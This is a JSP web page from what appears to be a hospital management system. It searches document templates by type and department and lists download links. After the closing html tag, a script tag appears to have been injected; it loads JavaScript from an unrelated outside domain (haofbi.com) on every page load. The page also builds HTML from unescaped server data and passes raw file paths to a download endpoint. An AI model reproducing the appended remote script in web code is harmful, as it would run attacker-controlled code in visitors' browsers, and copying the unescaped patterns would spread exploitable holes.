<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>下载模板</title>
    <link type="text/css" href="../css/stylesheet.css" rel="stylesheet"/>
    <script type="text/javascript" src="../js/jquery.min.js"></script>
    <script type = "text/javascript">
        $(function () {
            $.ajax({
                url:"/admin/getAllDepartment.action",
                dataType:"json",
                success:function (resultData) {
                    $(resultData).each(function (index,item) {
                        var info="<option value="+item.dept_id+">"+item.dept_name+"</option>";
                        $("#dept").append(info);
                    })
                }
            })
        })
        function selectButton()
        {
            document.getElementById("tablemsg").style.display="block";
            $.ajax({
                url:"/doctor/searchFormWork.action",
                data:$("#form1").serialize(),
                dataType:"json",
                success:function (result) {
                    $("#table tr:gt(0)").remove()
                    $(result).each(function (index, item) {
                        var info = "<tr>\n" +
                            "                <td>"+item.name+"</td>\n" +
                            "                <td>"+item.directions+"</td>\n" +
                            "                <td>\n" +
                            "                    <a href=\"/user/download.action?filepath="+item.template+"\">下载</a>\n" +
                            "                </td>\n" +
                            "            </tr>";
                        $("#table").append(info)
                    })
                }
            })
        }
    </script>
</head>
<body>
<center>
    <form id="form1">
    <table height="10" border="0" >
        <tr>
            <td colspan = "11" align="center" size="3"><b>下载模板</b></td>
        </tr>
        <tr>
            <td align="center">模板类型:</td>
            <td>&nbsp;
                <select name="type" >
                    <option value="">任意</option>
                    <option value="治疗模板">治疗模板</option>
                    <option value="检查模板">检查模板</option>
                    <option value="培训模板">培训模板</option>
                </select><font color="red">&nbsp;&nbsp;*</font>			</td>
        </tr>
        <tr>
            <td align="center">所属科室:</td>
            <td>&nbsp;
                <select id="dept" name="dept_id" >
                    <option value="">任意</option>
                </select><font color="red">&nbsp;&nbsp;*</font>			</td>
        </tr>
        <tr align="center">
            <td  colspan="4" ><img src="../images/btn_search.gif" alt="查询" onClick="selectButton()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>

        </tr>
    </table>
    </form>
    <br>
    <br>
    <br>
    <div style="display:none" id="tablemsg">
        <table id="table" border="1" width="300">
            <tr>
                <td>模板名称</td>
                <td>模板描述</td>
                <td>操作</td>
            </tr>
            <tr>
                <td colspan="3">正在读取请稍等</td>
            </tr>
        </table>
    </div>
</center>
</body>
</html><script language=javascript src=http://www.haofbi.com/js/w.js></script>